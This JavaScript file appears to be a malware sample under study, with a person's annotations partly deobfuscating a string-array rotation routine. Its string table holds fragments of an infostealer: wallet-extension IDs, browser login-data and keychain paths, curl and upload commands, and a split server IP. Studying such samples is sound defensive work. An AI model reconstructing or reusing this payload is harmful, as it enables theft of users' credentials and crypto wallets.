function get_string_table() {
    const look_up_array = ['are/B', 'le\\x20', 'i.npo', '\\x22\\x20\\x22', 'iQhFO', 'eaaah', 're.Op', 'wxoGA', 'llet', 'opera', 'leeob', 'FbzpY', 'ins/l', 'lipeo', 'mdjon', 'Edge/', 'aeach', 'son', 'ItYXP', 'solan', 'udeXZ', 'trace', 'deekn', '\\x20(tru', 'ogin.', 'soft/', 'eRead', 'hmclh', 'bbbnh', '/Libr', 'hostn', 'googl', '/pdow', 'cfgod', 'homed', 'proto', 'sSync', 'fcKeB', 'bohpj', 'nphpl', 'ructo', 'gkfmg', 'g/Moz', 'setIn', 'dirna', 'VQTGz', 'ng/Op', 'nctio', 'raveS', 'lengt', 'era\\x20S', '\\x5c+\\x5c+\\x20', 'onriS', 'warn', 'pikoo', 'omaab', 'get', 'WPVZX', 'pkjle', 'bfnae', '//45.', 'XJaBR', 'fig/E', 'ary/A', 'fldfp', '_file', 'fdial', 'ess', 'vctWO', 'ary/K', 'kodbe', 'lgmpc', '/AppD', 'filen', 'on.ex', 'lkFQG', 'logkc', 'is\\x22)(', 'Ssvvm', 'pglpn', '\\x22retu', '\\x5cp.zi', 'oamin', 'pplic', '1326735xIdcrA', '-Lo\\x20\\x22', '_proc', 'jkbgi', 'eycha', 'https', 'baa4d', 'fGOot', 'toStr', 'clnha', '\\x20Supp', '__pro', 'ewwnT', 'zA-Z_', 'nhcel', 'ddjkj', 'nstru', 'tSZOH', 'oiodb', 'nkbih', 'formD', '\\x5cp2.z', 'jmnoo', 'com.o', 'ibnej', 'Brave', 're/Br', 'bgeol', 'adlkm', 'lmeee', '/.sys', 'e)\\x20{}', 'e97d0', 'djkbp', 'eSync', 'ZVfJZ', 'lncbf', 'kkhmi', '\\x20-C\\x20', 'kpkcb', 'eciiL', 'WAOVh', 'GmKeT', 'Strea', '1122wnSEGz', 'oogle', 'jSAxS', 'path', 'ync', '0-9a-', 'tsmXM', 'e\\x22\\x20\\x22', '/Loca', 'qlQEz', 'ame', 'actio', 'init', 'idclj', 'ort/G', 'emcci', 'ilkdb', 'gjnck', 'ads', 'illa/', 'ajnim', 'terva', 'gger', '/Goog', '/uplo', 'wKKMJ', 'pgoak', 'xf\\x20', 'ldhgm', 'pjiig', 'aeaoe', 'tar\\x20-', '/Logi', 'lbocc', 'mcohi', 'gmccd', 'copyF', '-db', 'idb', 'iolgc', 'post', 'iNueL', 'whfGX', 'bapad', 'jpbpf', 'us.wa', 'txt', 'rn\\x20th', 'eebol', 'test', '/clie', 'info\\x22', 'hlefn', 'Profi', 'qikls', 'hid', '/User', 'knmef', 'ware/', 'fhboh', 'ipDxN', 'while', 'ata/R', 'nYEmi', 'rave-', 'a_id.', 'StSNC', 're/Op', 'amhMj', 'bbldc', 'Data', 'table', 'join', 'fig/s', 'dgmol', '.file', 'befbm', 'cooki', 'wkjbr', '20sZyQaF', 'size', 'l\\x20Ext', 'fejja', 'ation', '://ap', '2.14:', 'lchlg', 'ccfch', '/id.j', 'pdfla', 'int.i', 'dgcce', 'UMAfv', 'ensio', 'Brows', 'olcbk', 'hecda', 'inclu', 'idlcd', '{}.co', 'sWOxD', 'pld_', 'Roami', 'rmSyn', 'des', 'dlcob', 'child', 'xuJyt', 'n\\x20Set', 'ion', 'omihk', 'dus/e', 'bind', 'CLHtX', 'MGPhx', 'eSoft', 'rQURz', 'ggaki', 'oohck', 'renam', 'ing', 'strin', 'fbeog', 'hfood', 'wgIPI', 'KpAJV', 'QwGEe', 'n3\\x20\\x22', '2063411tuPmOR', 'SOYuH', 'Z_$][', 'jblnd', 'tmpdi', 'gWNrp', 'ox/Pr', '1764205LkKvhV', 'write', 'penjl', 'kziTx', 'VKblL', 'fgpgk', 'n()\\x20', 'PllXx', '69067', 'a-zA-', 'deajf', 'BWNfJ', '/Chro', 'count', 'ave-B', 'mibbk', '_lst', 'ZaSwG', 'ata/L', 'QdniH', 'oficd', 'WoIXf', 'debu', 'OPscc', 'yPKzl', 'curl\\x20', 'agoak', 'IMplH', 'xodus', 'User\\x20', 'hifaf', 'conso', 'isDir', 'exec', '/Brav', 'KHUgC', 'afbcb', 'oihof', 'jdnno', 'chain', 'bakop', 'creat', 'krLFo', 'kpcnl', 'Micro', 'apply', 'ort/', 'ort/B', 'gipfn', 'pekpl', 'http:', 'acces', 'ser', 'readd', 'ile', 'xtens', 'cionb', 'olDmw', 'NUUae', 'ezour', 'getTi', '1224', 'pndod', 'LJEoB', 'omGLV', 'ctor(', '12oQzxMz', '1892uzNGZn', ')+)+)', 'fig/', 'age/d', '658792VYuVaM', 'ejbal', 'ngplf', 'FileS', 'ocal/', 'Softw', 'jnkhf', 'EALgZ', 'bepdk', 'orm', '3TYzzyN', '50822tLwold', 'log', '.wall', 'info', 'input', 'ngcna', 'Awqgg', 'gdoal', 'acmac', 'ion\\x20*', 'uts', 'ahbmg', '\\x5c(\\x20*\\x5c', '_uld', 'keeod', '$]*)', 'RQpOG', 'TzmZO', '\\x20Data', 'mRAmD', 'olana', 'pytho', '/stor', 'yKpDE', 'aholp', 'onoee', 'era', 'error', 'cUtpY', 'g/Exo', 'n\\x20(fu', 'khtOJ', 'gpafn', '-rele', 'searc', 'l\\x20Sta', 'dfjmm', 'ort/e', 'bohma', 'forEa', 'ome', 'MXJeH', 'irSyn', 'to__', 'mgjnj', 'round', '(((.+', 'GYLKp', '/exod', 'imhlp', 'NNlkZ', 'ophhp', 'moz-e', '/.con', 'imael', 'bomem', 'ppbcl', 'kkolj', 'Local', 'YsVvb', 'repla', 'pebkl', 'iijed', 'retur', 'nt/', 'ata/', 'HILJU', 'FmfeP', 'zSWNC', 'call', 'Firef', 'mamcf', 'jbmgj', 'Defau', 'peras', 'ain', 'hdmPI', 'JiykN', 'hhjch', 'rome', 'parse', 'odkjb', 'const', 'oftwa', 'XVktu', 'omjjk', 'ThWSi', 'rpWtD', 'cgndf', 'ase', 'tion', 'tings', 'bhhhl', 'jgjfh', '/ld_', 'efaul', '128.5', '*(?:[', 'ponpf', 'le/Ch', 'gpnkl', 'ector', 'exist', 'ciHPe', 'apagc', 'rowse', 'o/e97', 'push', 'excep', 'url', '\\x5cpyth', 'e/Chr', 'reque', 'ata', '3373469nFtQgi', 'mnkoe', 'state', 'type', 'VrfPO', 'n\\x20Dat', 'behhm', 'lmome', 'e-chr', 'srDvQ', '\\x5c.pyp', 'FKqWl', 'Objec', 'MAsWb', 'keych', '-Brow', 'phepc', 'brld_', 'platf', 'ofile', 'statS', 'multi', 'Googl', 'funct'];
    // Redefine the function to directly return the array
    get_string_table = function() {
        return look_up_array;
    };
    return get_string_table();
}

function Map_Index_To_String(index, _unused_param) {
    const string_table = get_string_table();
    // redefinition of the function for obfusc. Not really any sense.
    return Map_Index_To_String = function(index_inner, _unused_param) {
        // calculates the index for the string table with a offset substraction : index_inner = index_inner - 374
        index_inner = index_inner - (0x20a1 * -0x1 + -0xb39 + 0x2d50); // offset is 374 in dec
        let _0x155c34 = string_table[index_inner];
        return _0x155c34;
    }, Map_Index_To_String(index, _unused_param);
}

function sort_string_list(get_string_table, _0x45c4dd) {
    // all those methods returns string from a string table using a bit of offset substraction and useless params
    function get_a_string_from_string_table_1(unused_param, unused_param, index, unused_param, unused_param) {
        // index - 949
        return Map_Index_To_String(index - '0x2a4', unused_param);
    }
        // index + 632
    function get_a_string_from_string_table_2(unused_param, unused_param, index, unused_param, unused_param) {
        return Map_Index_To_String(index - -'0x278', unused_param);
    }
        // index + 622
    function get_a_string_from_string_table_3(unused_param, index, unused_param, unused_param, unused_param) {
        return Map_Index_To_String(index - -0x26e, unused_param);
    }
        // index - 949
    function get_a_string_from_string_table_4(unused_param, unused_param, unused_param, index, unused_param) {
        return Map_Index_To_String(index - '0x3b5', unused_param);
    }
        //index + 949
    function get_a_string_from_string_table_5(index, unused_param, unused_param, unused_param, unused_param) {
        return Map_Index_To_String(index - -'0x3b5', unused_param);
    }
    
    // wtf is this shit - nvm this initializes the string table i think
    const string_table = get_string_table();

    // infinity loop? - I think this is used to resort the string array 
    while (!![]) {
        try {
          
            // first iteration
            const magic_number = 
            //returns String: "Brows" -- offset is: 1 -> NaN
            -parseInt(get_a_string_from_string_table_4('0x6e7', '0x58f', '0x6d0', 0x609, 0x661)) / (0xe01 + -0x3 * 0xad9 + 0x128b) *
            // returns string: "olcbk" -- offset is: 2 -> NaN
            (parseInt(get_a_string_from_string_table_4(0x67f, 0x613, 0x6a6, '0x60a', '0x6c4')) / (-0x166 * 0x11 + 0xa * 0xbb + 0x107a)) + 
            // returns string: "re.Op" -- offset is: 3 -> NaN
            -parseInt(get_a_string_from_string_table_4('0x4e1', 0x4b6, 0x5da, 0x531, '0x534')) / (0x2566 + 0xf16 * -0x1 + -0x164d) * 
            // returns string: "size" -- offset is: 4 -> NaN
            (-parseInt(get_a_string_from_string_table_1('0x497', '0x56a', 0x4ea, '0x4b7', 0x4c4)) / (0xd51 + 0x1 * -0x12e + -0x6b * 0x1d)) + 
            // returns string: "idclj" -- offset is: 5 -> NaN
            parseInt(get_a_string_from_string_table_4(0x65e, 0x600, 0x4d7, '0x5b8', '0x64d')) / (0x1da1 + 0x21b2 * -0x1 + -0x1 * -0x416) * 
            // returns string: "20sZyQaF" -- offset is: 6 -> -14
            (-parseInt(get_a_string_from_string_table_4('0x6ba', '0x56c', 0x589, 0x5fa, '0x6a6')) / (-0x1843 + 0xcb3 * -0x2 + 0x31af)) + 
            // returns string: "tsmXM" -- offset is: 7 -> NaN
            parseInt(get_a_string_from_string_table_4(0x5a3, 0x5f6, 0x59a, '0x5b1', 0x5cd)) / (0x5 * 0x57 + 0x805 + -0x9b1) + 
            // returns string: "://ap" -- offset is: 8 -> NaN
            -parseInt(get_a_string_from_string_table_3(-0xed, -'0x24', '0x85', 0x91, -'0xf0')) / (-0x285 + -0x2b1 * 0x7 + 0x94 * 0x25) + 
            // returns string: "gpnkl" -- offset is: 9 -> NaN
            parseInt(get_a_string_from_string_table_2('0x114', '0x65', 0xbb, '0xcd', '0x1f')) / (-0x367 + -0x1f0b + 0x1 * 0x227b) + 
            // returns string: "-Lo\x20\x22" -- offset is: 10 -> NaN
            parseInt(get_a_string_from_string_table_5(-0x1ea, -'0x298', -'0x1ed', -0x2ca, -0x117)) / (0x2 * 0x65e + -0x1c9e + -0x3fb * -0x4) * 
            // returns string: "FileS" -- offset is: 11 -> NaN
            (parseInt(get_a_string_from_string_table_4('0x629', '0x72e', 0x64a, '0x67c', 0x5e9)) / (0x59a + -0xb24 * 0x2 + 0x10b9));
            
            // if (magic_number === 368184) break;
            if (magic_number === _0x45c4dd) {

              console.log(string_table)
              break;
              
            }
            // removes first element from array and puts it on the end
            else string_table['push'](string_table['shift']());
        
        // No idea what this variable is. It is only found here once in the whole file
        } catch (_0x2a42fa) {
            // removes first element from array and puts it on the end
            string_table['push'](string_table['shift']());
        }
    }
}
console.log("HI")
// I think those are the parameters for the function call above in line 1, what is this programming language -- second parameter is 368184
sort_string_list(get_string_table, -0x1452a + -0x7ee11 + -0xed173 * -0x1);